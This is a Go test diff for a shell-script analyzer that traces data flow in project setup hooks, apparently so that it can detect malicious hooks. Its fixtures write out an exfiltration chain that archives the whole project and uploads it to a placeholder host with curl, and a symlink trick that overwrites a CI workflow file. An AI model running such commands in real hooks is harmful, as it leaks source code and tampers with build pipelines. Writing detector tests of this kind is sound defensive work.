@@ -112,6 +112,60 @@ func TestOutputRedirectCreatesStatementLocalFlow(t *testing.T) {
 	}
 }
 
+func TestArtifactFlowRelations(t *testing.T) {
+	t.Parallel()
+
+	parsed := shell.NewParser().Parse([]byte(`find /project -type f -print0 > /tmp/files.list
+tar --files-from=/tmp/files.list --create --file=/tmp/archive.tar
+cp /tmp/archive.tar /tmp/staged.tar
+curl --upload-file /tmp/staged.tar https://example.invalid/upload
+`), "fixture/hooks/setup-project")
+	result := analysis.Analyze("setup-project", &parsed)
+	wantArtifacts := map[string]bool{
+		"/tmp/files.list":  false,
+		"/tmp/archive.tar": false,
+		"/tmp/staged.tar":  false,
+	}
+	collection := false
+	for _, relation := range result.Relations {
+		if relation.Kind == analysis.RelationCollectionFlow && relation.Artifact.Literal == "/project" {
+			collection = true
+		}
+		if relation.Kind == analysis.RelationArtifactFlow {
+			if _, ok := wantArtifacts[relation.Artifact.Literal]; ok {
+				wantArtifacts[relation.Artifact.Literal] = true
+			}
+			if len(relation.Provenance) == 0 || relation.Provenance[0].Kind != "project" || len(relation.Provenance[0].Paths) == 0 || relation.Provenance[0].Paths[0].Literal != "/project" {
+				t.Errorf("artifact provenance was not preserved: %#v", relation)
+			}
+		}
+	}
+	if !collection {
+		t.Errorf("missing collection relation: %#v", result.Relations)
+	}
+	for artifact, found := range wantArtifacts {
+		if !found {
+			t.Errorf("missing artifact relation for %s: %#v", artifact, result.Relations)
+		}
+	}
+}
+
+func TestStaticProjectAliasRelation(t *testing.T) {
+	t.Parallel()
+
+	parsed := shell.NewParser().Parse([]byte("ln -s /project /tmp/workspace\ncp /tmp/ci.yml /tmp/workspace/.github/workflows/ci.yml\n"), "fixture/hooks/setup-project")
+	result := analysis.Analyze("setup-project", &parsed)
+	var alias bool
+	for _, relation := range result.Relations {
+		if relation.Kind == analysis.RelationAlias && relation.Name == "/tmp/workspace/.github/workflows/ci.yml" && relation.Artifact.Literal == "/project/.github/workflows/ci.yml" {
+			alias = true
+		}
+	}
+	if !alias {
+		t.Errorf("missing alias relation: %#v", result.Relations)
+	}
+}
+
 func flattenOperations(operations []analysis.Operation) []analysis.Operation {
 	var flattened []analysis.Operation
 	for _, operation := range operations {
